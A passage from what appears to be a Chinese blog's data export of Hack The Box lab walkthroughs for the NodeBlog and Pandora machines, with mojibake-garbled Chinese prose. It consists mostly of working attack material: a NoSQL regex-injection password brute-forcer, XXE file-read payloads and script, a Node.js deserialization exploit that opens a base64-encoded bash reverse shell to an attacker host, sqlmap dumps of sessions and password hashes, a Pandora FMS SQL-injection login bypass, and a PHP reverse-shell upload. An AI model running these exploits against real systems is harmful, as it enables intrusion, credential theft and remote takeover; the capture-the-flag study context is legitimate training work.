application/json'\nHTTP/1.1 200 OK\nX-Powered-By: Express\nSet-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; Expires=Thu, 20 Jan 2022 10:27:09 GMT; HttpOnly\nContent-Type: text/html; charset=utf-8\nContent-Length: 2589\nETag: W/\"a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA\"\nDate: Thu, 20 Jan 2022 10:12:09 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n```\nå°è¯•äº†ä¸€ä¸‹regexæ³¨å…¥ï¼Œç¡®è®¤æ˜¯å¯ä»¥å¹¶ä¸”å­˜åœ¨nosqlæ³¨å…¥çš„\n\n## æ¼æ´åˆ©ç”¨\né¦–å…ˆå»ç¡®å®šä¸€ä¸‹adminè´¦æˆ·æ‰€ä½¿ç”¨å¯†ç çš„é•¿åº¦\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{24}$\"}}' -H 'Content-Type: application/json' | grep Invalid \n            Invalid Password\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{25}$\"}}' -H 'Content-Type: application/json' | grep Invalid\n```\næˆåŠŸç¡®å®šå¯†ç çš„ä½æ•°ä¸º25ä½\n\nå¯ä»¥ä½¿ç”¨regexæ­£åˆ™åŒ¹é…ä¸€ä¸ªä¸€ä¸ªç¡®è®¤å¯†ç æ˜¯å•¥ï¼Œä¸è¿‡å†…å®¹å¤ªç¹çäº†ï¼Œè¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªè„šæœ¬ï¼Œç›´æ¥ä½¿ç”¨è„šæœ¬è¿›è¡Œåˆ©ç”¨\n\n```bash\n#!/usr/bin/env bash\n\nurl=10.10.11.139:5000/login\nuser=admin\n\nfunction do_nosqli() {\n    curl $url -H 'Content-Type: application/json' -sd $1 | grep Invalid\n}\n\nwhile true; do\n    data='{\"user\":\"'$user'\",\"password\":{\"$regex\":\"^.{'$password_length'}$\"}}'\n    echo -ne \"Password length: $password_length\\r\"\n\n    if [ -z \"$(do_nosqli \"$data\")\" ]; then\n        break\n    fi\n\n    password_length=$((password_length + 1))\ndone\n\necho\n\nfor i in $(seq 1 $password_length); do\n    echo -ne \"Password: $password\\r\"\n\n    for c in {A..Z} {a..z} {0..9}; do\n        data='{\"user\":\"'$user'\",\"password\":{\"$regex\":\"^'$password$c'.{'$(($password_length - $i))'}$\"}}'\n\n        if [ -z \"$(do_nosqli $data)\" ]; then\n            password+=$c\n            break\n        fi\n    done\ndone\n\necho\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# bash nosqli.sh\nPassword length: 25\nPassword: IppsecSaysPleaseSubscribe\n```\næˆåŠŸæ‹¿åˆ°è´¦å·å¯†ç ï¼Œå»åå°ç™»å½•\n\n![image](Hackthebox-NodeBlog/aacd32a4-2b3b-4423-a25d-b675844deed8.png)\n\næˆåŠŸç™»å½•\n\n```bash\nError: Failed to lookup view \"articles/${path}\" in views directory \"/opt/blog/views\"\n    at Function.render (/opt/blog/node_modules/express/lib/application.js:580:17)\n    at ServerResponse.render (/opt/blog/node_modules/express/lib/response.js:1012:7)\n    at /opt/blog/routes/articles.js:81:17\n    at processTicksAndRejections (internal/process/task_queues.js:95:5)\n```\nå°è¯•åˆ›å»ºä¸€ç¯‡æ–°æ–‡ç« æ—¶æŠ¥é”™\n\n```bash\nInvalid XML Example: Example DescriptionExample Markdown\n```\nä¸Šä¼ æ–°æ–‡ä»¶æ—¶æç¤ºæ— æ•ˆçš„XMLç¤ºä¾‹\n\nç°åœ¨æ¢³ç†ä¸€ä¸‹æˆ‘ä»¬æ‹¥æœ‰çš„æ¡ä»¶\n\n1. çŸ¥é“ç¨‹åºçš„ç»å¯¹è·¯å¾„åœ¨/opt/blog\n2. éœ€è¦ä¸Šä¼ ä¸€ä¸ªæ­£ç¡®çš„XMLç¤ºä¾‹\n\né‚£å’±ä»¬å°±æ¥æ„é€ ä¸€ä¸ªå§\n\n```bash\n<?xml version=\"1.0\"?>\n<post>\n  <title>Lucifiel</title>\n  <description></description>  \n  <markdown></markdown>\n</post>\n```\n![image](Hackthebox-NodeBlog/1a838379-db7b-4bcf-8950-9ca63d0332b9.png)\n\nä¸Šä¼ è¯¥xmlæ–‡ä»¶ä¼šè·³è½¬åˆ°ç¼–å†™æ–°æ–‡ç« \n\n```bash\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>  \n<post>\n  <title>Lucifiel</title>\n  <description>&xxe;</description>\n  <markdown></markdown>\n</post>\n```\n![image](Hackthebox-NodeBlog/400836e5-187f-407c-a39b-bcc75034975b.png)\n\næˆåŠŸæ‰§è¡ŒXXE\n\nç”¨ä¸€ä¸ªpythonè„šæœ¬æ¥æ‰§è¡Œä»»æ„æ–‡ä»¶è¯»å–\n\n```python\n#!/usr/bin/env python3\n\nimport html\nimport re\nimport requests\nimport sys\n\ndef send_xml(filename):\n    xml = f'''<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://{filename}\"> ]>\n<example>\n  <title></title>\n  <description>&xxe;</description>\n  <markdown></markdown>\n</example>\n'''\n\n    res = requests.post('http://10.10.11.139:5000/articles/xml', files={'file': ('test.xml', xml)})\n\n    return res.text\n\ndef main():\n    if len(sys.argv) == 1:\n        print(f'Usage: python3 {sys.argv[0]} <filename>')\n        exit(1)\n\n    filename = sys.argv[1]\n    xml = send_xml(filename)\n\n    try:\n        print(html.unescape(re.findall(r'<textarea.*?>(.*?)</textarea>', xml, re.DOTALL)[0]))\n    except IndexError:\n        print('Not Found')\n\nif __name__ == '__main__':\n    main()\n```\næ‰¾åˆ°äº†ä¸€ä¸ªåˆ©ç”¨è„šæœ¬\n\n```javascript\n#!/usr/bin/env node\n\nconst axios = require('axios')\n\nconst user = 'admin'\nconst password = 'IppsecSaysPleaseSubscribe'\nconst baseUrl = 'http://10.10.11.139:5000'\n\nconst [lhost, lport] = process.argv.slice(2, 4)\n\nconst login = async () => {\n  const res = await axios.post(`${baseUrl}/login`, { user, password })\n\n  return res.headers['set-cookie'][0]\n}\n\nconst rce = async (cookie, cmd) => {\n  const paramIndex = cookie.indexOf(';')\n\n  cookie =\n    cookie.substring(0, paramIndex - 3) +\n    encodeURIComponent(\n      `,\"rce\":\"_$$ND_FUNC$$_function() { require('child_process').exec('${cmd}') }()\"}`\n    ) +\n    cookie.substring(paramIndex)\n\n  await axios.get(baseUrl, { headers: { cookie } })\n}\n\nconst reverseShell = () =>\n  Buffer.from(`bash  -i >& /dev/tcp/${lhost}/${lport} 0>&1`).toString('base64')\n\nconst main = async () => {\n  if (!lhost || !lport) {\n    console.log('[!] Usage: node serialize-rce.js <lhost> <lport>')\n    process.exit()\n  }\n\n  const cookie = await login()\n  console.log('[+] Login successful')\n\n  await rce(cookie, `echo ${reverseShell()} | base64 -d | bash`)\n  console.log('[+] RCE completed')\n}\n\nmain()\n```","tags":["Hackthebox"]},{"title":"Pandora - Hackthebox","url":"/2022/01/08/Hackthebox/Easy/Hackthebox-Pandora/","content":"\n# Hackthebox - Pandora\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Pandora/0fa6493b-862e-4d4c-9f22-bad3eb5c01ae.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Pandora/7e90edbb-b890-4186-bbe4-04fee9d8975e.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.136\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 02:29 EST\nNmap scan report for 10.10.11.136\nHost is up (0.22s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)\n|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)\n|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Play | Landing\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=1/17%OT=22%CT=1%CU=41376%PV=Y%DS=2%DC=T%G=Y%TM=61E51AF\nOS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=C)SEQ\nOS:(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 256/tcp)\nHOP RTT       ADDRESS\n1   238.86 ms 10.10.14.1\n2   239.01 ms 10.10.11.136\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 59.77 seconds\n```\nå°†DNSè§£ææ·»åŠ åˆ°hosts\n\n```bash\necho 10.10.11.136 pandora.htb >> /etc/hosts\n```\nç„¶åå»çœ‹ä¸€ä¸‹80ç«¯å£\n\n![](Hackthebox-Pandora/51aa5e64-d6bb-4433-a4cb-4b21a317886b.png)\n\nåœ¨é¡µé¢ä¸Šæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œfuzzä¸‹ç›®å½•çœ‹çœ‹å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://pandora.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://pandora.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nassets                  [Status: 301, Size: 311, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 276, Words: 20, Lines: 10]\n                        [Status: 200, Size: 33560, Words: 13127, Lines: 908]\n:: Progress: [20116/20116] :: Job [1/1] :: 119 req/sec :: Duration: [0:03:26] :: Errors: 0 ::\n```\nä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæœ‰ç‚¹è¿·æƒ‘\n\næ‰«æä¸ªUDPç«¯å£çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sC -sV -sU -top-ports=20 pandora.htb                                                                                                                                                                130 â¨¯\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 20:30 EST\nNmap scan report for pandora.htb (10.10.11.136)\nHost is up (0.27s latency).\n\nPORT      STATE         SERVICE      VERSION\n53/udp    closed        domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    closed        tftp\n123/udp   open|filtered ntp\n135/udp   closed        msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)\n| snmp-info: \n|   enterprise: net-snmp\n|   engineIDFormat: unknown\n|   engineIDData: 48fa95537765c36000000000\n|   snmpEngineBoots: 30\n|_  snmpEngineTime: 20m46s\n| snmp-processes: \n|   1: \n| \n|   2: \n| \n|   3: \n| \n|_  4: \n| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64\n|_  System uptime: 20m46.36s (124636 timeticks)\n|_snmp-win32-software: \n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   open|filtered syslog\n520/udp   closed        route\n631/udp   closed        ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\nService Info: Host: pandora\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 135.89 seconds\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªsnmpå¼€ç€ï¼Œè€Œä¸”æ˜æ˜¾è¿˜æœ‰ä¿¡æ¯æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œæˆ‘æ„Ÿè§‰è¿™å°±æ˜¯çªç ´å£\n\n## æ¼æ´åˆ©ç”¨\nä½¿ç”¨snmpwalkæ‰«æä¸€ä¸‹pandora.htb\n\n```bash\nsnmpwalk -v 2c pandora.htb -c public > nmap\n```\n```bash\niso.3.6.1.2.1.25.4.2.1.5.870 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\n```\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = daniel\npassword = HotelBabylon23\n```\nå»sshç™»å½•è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh daniel@pandora.htb \ndaniel@pandora.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue 18 Jan 01:47:00 UTC 2022\n\n  System load:  0.12              Processes:             263\n  Usage of /:   64.4% of 4.87GB   Users logged in:       1\n  Memory usage: 12%               IPv4 address for eth0: 10.10.11.136\n  Swap usage:   0%\n\n  => /boot is using 91.8% of 219MB\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Tue Jan 18 01:12:05 2022 from 10.10.14.20\ndaniel@pandora:~$ whoami&&id\ndaniel\nuid=1001(daniel) gid=1001(daniel) groups=1001(daniel)\n```\næˆåŠŸç™»å½•\n\n```bash\ndaniel@pandora:~$ cd ../\ndaniel@pandora:/home$ ls\ndaniel  matt\ndaniel@pandora:/home$ cd matt\ndaniel@pandora:/home/matt$ ls\nLinEnum.sh  snmp-mibs-downloader  snmp-mibs-downloader_1.2.tar.xz  user.txt\ndaniel@pandora:/home/matt$ cat user.txt \ncat: user.txt: Permission denied\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªmattè´¦æˆ·ï¼Œå¹¶ä¸”æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®user.txtçš„flagæ–‡ä»¶ï¼Œé‚£å°±æ˜¯å¾—æƒ³åŠæ³•ææƒåˆ°mattç”¨æˆ·\n\n## æƒé™æå‡\n### Matt\næŸ¥çœ‹ä¸€ä¸‹ç«¯å£\n\n```bash\ndaniel@pandora:/home/matt$ netstat -tuplen\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        21170      -                   \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          24732      -                   \ntcp        0      0 0.0.0.0:5577            0.0.0.0:*               LISTEN      1000       119305     -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        24400      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      0          24759      -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      0          24585      -                   \nudp        0      0 127.0.0.53:53           0.0.0.0:*                           101        21169      -                   \nudp        0      0 0.0.0.0:161             0.0.0.0:*                           0          24804      -                   \nudp6       0      0 ::1:161                 :::*                                0          24805      -\n```\nè¿™é‡Œå¥½åƒæœ‰æœ¬åœ°ç½‘ç»œæœåŠ¡pandoraï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\ndaniel@pandora:/home/matt$ curl pandora.htb\n<meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=/pandora_console/\">\n```\nç¡®å®å­˜åœ¨ï¼Œä½¿ç”¨sshæŠŠç«¯å£è½¬å‘å‡ºæ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh -L 80:127.0.0.1:80 daniel@pandora.htb\ndaniel@pandora.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue 18 Jan 01:54:11 UTC 2022\n\n  System load:  0.0               Processes:             273\n  Usage of /:   64.6% of 4.87GB   Users logged in:       1\n  Memory usage: 19%               IPv4 address for eth0: 10.10.11.136\n  Swap usage:   0%\n\n  => /boot is using 91.8% of 219MB\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Tue Jan 18 01:47:01 2022 from 10.10.14.17\n```\nä»£ç†æˆåŠŸï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹127.0.0.1\n\n![](Hackthebox-Pandora/a104cc6b-49bd-418f-856e-e23c7f02bd40.png)\n\nè¿™é‡Œå‘ç°äº†ä¸€ä¸ªå…³é”®çº¿ç´¢v7.0NG.742\\_FIX\\_PERL2020\n\nå»æœç´¢ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬æœ‰æ²¡æœ‰æ¼æ´\n\n> [https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001](https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001)\n\næ‰¾åˆ°äº†ä¸€ä¸ªsqlæ³¨å…¥ï¼Œå’±ä»¬å»æ³¨å…¥å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# sqlmap -u \"http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1\" --batch --dbms=mysql -D pandora -T tsessions_php -C id_session,data --dump\n\n+----------------------------+------------------------------------------------------+\n| id_session                 | data                                                 |\n+----------------------------+------------------------------------------------------+\n| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:\"daniel\";                             |\n| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 |\n| 1um23if7s531kqf5da14kf5lvm | NULL                                                 |\n| 22eqdjecn219cpni093reba8ee | NULL                                                 |\n| 27ffs3tj8rpvrm2hd0juphhda7 | id_usuario|s:6:\"daniel\";                             |\n| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 |\n| 2uibrnof5j1k45g9u15tngrlju | NULL                                                 |\n| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:\"daniel\";                             |\n| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 |\n| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 |\n| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:\"daniel\";                             |\n| 59qae699l0971h13qmbpqahlls | NULL                                                 |\n| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 |\n| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:\"daniel\";                             |\n| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:\"daniel\";                             |\n| 6ctchv9r2gg7c6arpv4cipcfol | NULL                                                 |\n| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 |\n| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:\"daniel\";                             |\n| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 |\n| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:\"daniel\";                             |\n| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 |\n| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:\"daniel\";                             |\n| cbo2bdg3g7vfqgjmcuc75bq0aj | NULL                                                 |\n| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 |\n| cor29cq7l3ae4g8a423as7p422 | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| d0carbrks2lvmb90ergj7jv6po | NULL                                                 |\n| dsot94harh6hraanl60m698enq | NULL                                                 |\n| e58oalliogbu7jb1dc75dos90j | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:\"daniel\";                             |\n| fikt9p6i78no7aofn74rr71m85 | NULL                                                 |\n| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 |\n| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:\"daniel\";                             |\n| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b:0;  |\n| gf40pukfdinc63nm5lkroidde6 | NULL                                                 |\n| heasjj8c48ikjlvsf1uhonfesv | NULL                                                 |\n| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:\"daniel\";                             |\n| idlkl6lfsk05omgp2t42b8rlq9 | id_usuario|s:6:\"daniel\";                             |\n| j4415tiqm7kck5lkovi4qocch9 | NULL                                                 |\n| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:\"daniel\";                             |\n| knh7p9utl2089rprmm46nku2lr | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| kp90bu1mlclbaenaljem590ik3 | NULL                                                 |\n| l5817gd0prg6udd5sb5bufcvap | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                 |\n| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:\"daniel\";                             |\n| og8c3bqae2pts9i0l6c3s2u9aq | NULL                                                 |\n| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:\"daniel\";                             |\n| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:\"daniel\";                             |\n| qh9k9iaginhd7qqu7sda2ar27o | id_usuario|s:6:\"daniel\";                             |\n| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                 |\n| r02qbtlhv3uq49mv0f4a3s4k8v | NULL                                                 |\n| r097jr6k9s7k166vkvaj17na1u | NULL                                                 |\n| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:\"daniel\";                             |\n| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:\"daniel\";                             |\n| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:\"daniel\";                             |\n| v0l5i5vhf7bsk2n3k2f90nu4bi | NULL                                                 |\n+----------------------------+------------------------------------------------------+\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# sqlmap -u \"http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1\" --batch --dbms=mysql -D pandora -T tpassword_history -C id_pass,id_user,data_end,password,data_begin --dump\n\n+---------+---------+----------+----------------------------------+------------+\n| id_pass | id_user | data_end | password                         | data_begin |\n+---------+---------+----------+----------------------------------+------------+\n| 1       | matt    |          | f655f807365b6dc602b31ab3d6d43acc |            |\n| 2       | daniel  |          | 76323c174bd49ffbbdedf678f6cc89a6 |            |\n+---------+---------+----------+----------------------------------+------------+\n```\né¦–å…ˆä½¿ç”¨å¦‚ä¸‹pocè¿›è¡Œè·³è¿‡\n\n```bash\nhttp://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO\n```\nç„¶åç›´æ¥è®¿é—®[http://127.0.0.1/pandora\\_console/](http://127.0.0.1/pandora_console/)å³å¯ä»¥adminæƒé™è¿›è¡Œç™»å½•\n\n![](Hackthebox-Pandora/45d4ee8d-aa50-4f1e-a340-27797e4dd157.png)\n\n![](Hackthebox-Pandora/ad167d54-ce9c-4c00-a1b9-595e2a106af5.png)\n\né€‰æ‹© Admin tools -> File manager\n\n> [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)\n\nä½¿ç”¨è¯¥shellï¼Œå…ˆä¿å­˜åˆ°æœ¬åœ°ç„¶åç¨å¾®ä¿®æ”¹ä¸€ä¸‹\n\n![](Hackthebox-Pandora/6de77216-aa87-468f-ae88-b15eb6f4e3c7.png)\n\nç„¶åupload fileä¸Šä¼ \n\n![](Hackthebox-Pandora/07ca810c-e853-4818-b59a-4cbe1c5e8fc8.png)\n\nä¼ ä¸Šå»ååœ¨[http://127.0.0.1/pandora\\_console/images/phpshell.php](http://127.0.0.1/pandora_console/images/phpshell.php)å¯ä»¥æ‰¾åˆ°shell\n\næœ¬åœ°å¯åŠ¨ä¸€ä¸ªncç›‘å¬ç«¯å£ï¼Œç„¶åè®¿é—®è¯¥shell\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                     \nlistening on [any] 4444 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.11.136] 58582\nLinux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n 03:15:11 up 15 min,  4 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\ndaniel   pts/0    10.10.14.17      03:00   14:23   0.03s  0.03s -bash\ndaniel   pts/1    10.10.14.20      03:01   11:35   0.26s  0.21s python3 sqlpwn.py -t localhost\ndaniel   pts/2    10.10.14.128     03:02   11.00s  0.20s  0.02s ssh -L 8000:localhost:80 daniel@pandora.htb\ndaniel   pts/4    127.0.0.1        03:14   15.00s  0.02s  0.02s -bash\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami&&id\nmatt\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n```\næˆåŠŸæ‹¿åˆ°mattæƒé™çš„shell\n\n```bash\n$ cat user.txt\n083fe340ff06c9a855f56ee98eaa62fd\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n### Root\n```bash\nmatt@pandora:/home/matt$ find / -perm -u=s 2> /dev/null\nfind / -perm -u=s 2> /dev/null\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/pandora_backup\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/at\n/usr/bin/fusermount\n/usr/bin/chsh\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n```\næ£€æŸ¥ä¸€ä¸‹å¯åˆ©ç”¨æ–‡ä»¶\n\nå…¶ä¸­/usr/bin/pandora\\_backupå¯åˆ©ç”¨\n\n```bash\nmatt@pandora:/home/matt$ sudo /usr/bin/pandora_backup\nsudo /usr/bin/pandora_backup\nsudo: PERM_ROOT: 